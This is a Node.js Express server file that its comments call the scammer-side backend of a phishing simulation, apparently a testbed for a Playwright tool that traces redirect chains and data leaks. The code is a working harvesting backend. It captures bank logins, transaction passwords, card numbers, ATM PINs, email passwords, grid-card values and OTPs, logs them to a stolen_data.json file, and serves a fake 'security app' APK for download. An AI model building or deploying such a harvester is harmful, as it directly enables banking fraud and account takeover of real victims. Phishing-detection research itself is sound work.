// this is scammer end server which will store the user data 
// when the user will fill the form, it will exfiltrate (exit or leak) data secretly to the scammer side server
// Playwright will detect ki kis raaste se user data konse IP address aur URL pe redirect ho rha hai, if the data bounces through multiple URLs (REDIRECT CHAINS) => playwright will detect that chain and analyzes what user data is being leaked.


const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to handle form data
app.use(express.urlencoded({ extended: true }));

// Serve static files from the 'pages' folder
app.use(express.static(path.join(__dirname, 'pages')));

/**
 * Function to save harvested data into a JSON file.
 * This simulates the exfiltration part of a phishing attack.
 */
const saveStolenData = (data) => {
    const filePath = path.join(__dirname, 'stolen_data.json');
    let db = [];

    if (fs.existsSync(filePath)) {
        try {
            db = JSON.parse(fs.readFileSync(filePath));
        } catch (e) {
            db = [];
        }
    }

    // Add timestamp for the log
    db.push({ ...data, capturedAt: new Date().toLocaleString() });

    fs.writeFileSync(filePath, JSON.stringify(db, null, 2));
};

// Route: Root redirects to the first step of the simulation
app.get('/', (req, res) => {
    res.redirect('/1_redirect.html');
});

// Route: API to harvest login and card details
app.post('/api/harvest-login', (req, res) => {
    console.log('🚨 ALERT: Sensitive Data Captured!');
    console.log(req.body); // Terminal mein dikhega kya chori hua

    // Save to file
    saveStolenData({
        category: "FULL_PROFILE_PHISH",
        credentials: {
            corpId: req.body.corp_id,
            userId: req.body.username,
            password: req.body.password,
            txnPassword: req.body.txn_password
        },
        cardDetails: {
            cardNumber: req.body.card_number,
            atmPin: req.body.pin
        },
        personalInfo: {
            name: req.body.fullname,
            mobile: req.body.mobile,
            email: req.body.email,
            emailPass: req.body.email_pass
        },
        atmGrid: {
            A: req.body.g_a, B: req.body.g_b, C: req.body.g_c, D: req.body.g_d,
            E: req.body.g_e, F: req.body.g_f, G: req.body.g_g, H: req.body.g_h,
            I: req.body.g_i, J: req.body.g_j, K: req.body.g_k, L: req.body.g_l,
            M: req.body.g_m, N: req.body.g_n, O: req.body.g_o, P: req.body.g_p
        }
    });

    // Move to next step (OTP verification)
    res.redirect('/3_otp.html');
});

// Route: API to harvest OTP
app.post('/api/harvest-otp', (req, res) => {
    console.log('🚨 ALERT: OTP Captured:', req.body.otp);
    saveStolenData({
        category: "OTP_BYPASS",
        otp: req.body.otp
    });
    res.redirect('/4_success.html');
});

// Route: Handle APK Download
app.get('/download-security-app', (req, res) => {
    const file = path.join(__dirname, 'pages', '5_fake.apk');
    if (fs.existsSync(file)) {
        res.download(file);
    } else {
        res.status(404).send("File not found. Please place '5_fake.apk' in 'pages' folder.");
    }
});

app.listen(PORT, () => {
    console.log(`
    =============================================
    🔥 Scam Simulation Server is running!
    🔗 Local URL: http://localhost:${PORT}
    📂 Data Log: stolen_data.json
    =============================================
    `);
});